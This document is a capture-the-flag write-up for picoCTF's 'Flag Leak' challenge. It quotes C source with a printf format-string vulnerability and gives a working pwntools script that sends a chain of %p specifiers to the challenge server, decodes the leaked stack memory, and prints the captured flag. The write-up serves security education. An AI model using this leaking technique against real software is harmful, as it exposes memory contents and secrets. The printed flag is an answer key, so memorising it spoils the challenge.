# Writeup: Flag Leak

## Introduction

As the title of this challenge suggests we will be taking advantage of the format string vulnerability and leaking values from the stack. When looking through the source code we can see that the flag is located on the stack of the function called vuln. In this function the flag is read into the flag buffer using the readflag function.

```
    void readflag(char* buf, size_t len) {
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
      }

      fgets(buf,len,f); // size bound read
    }

    void vuln(){
       
       char flag[FLAGSIZE]
       char story[128];
       
       readflag(flag, FLAGSIZE);

       printf("Tell me a story and then I'll tell you one >> ");
       scanf("%127s", story);
       printf("Here's a story - \n");
       printf(story);
       printf("\n");
    }
```
Since this program prompts us for input and reads the input into a buffer on the stack we can leak information stored on the stack, in this case we want to leak the information read into the flag buffer. 

## Writing The Script

Now that we have a plan of action we can get to writing the script. My plan is to leak an arbitrary amount of addresses until I see which hex values are actually the ascii values stored in the flag buffer. To do this I will send the payload of %p format specifiers and the read the output into a variable which I will then divide up into bytes and convert to ASCII and immediately after print out the result. After tweaking the payload a bit this is the script I settled on:

```
    from pwn import *


    p = remote('saturn.picoctf.net', 59402)

    p.recvuntil(b'>> ')

    payload = b'%31$p.%32$p.%33$p.%34$p.%35$p.%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p.%46$p.%47$p.%48$p.%49$p.%50$p.%51$p.%52$p.%53$p.%54$p.%55$p'
    p.sendline(payload)
    p.recvuntil(b'\n')
    response = p.recvline().strip().decode();
    values = response.split('.')
    print(values)
    for val in values:
        try:
            num = int(val, 16)

            num_bytes = (num.bit_length() + 7) // 8

            b = num.to_bytes(num_bytes, 'little')

            print(''.join(chr(x) if 32 <= x <= 127 else '' for x in b), end='')
        except:
            pass


    print()
``` 

## Results

Finally we can deploy the script and send the payload.

```
    [+] Opening connection to saturn.picoctf.net on port 59402: Done
    ['0x24393425', '0x35252e70', '0x2e702430', '0x24313525', '0x252e70', '0x6f636970', '0x7b465443', '0x6b34334c', '0x5f676e31', '0x67346c46', '0x6666305f', '0x3474535f', '0x315f6b63', '0x62326131', '0x7d613235', '0xfbad2000', '0x7510dc00', '(nil)', '0xe88e3990', '0x804c000', '0x8049410', '%']
    %49$p.%50$p.%51$p.%picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a} u9
    [*] Closed connection to saturn.picoctf.net port 59402
```

And finally we have the flag!
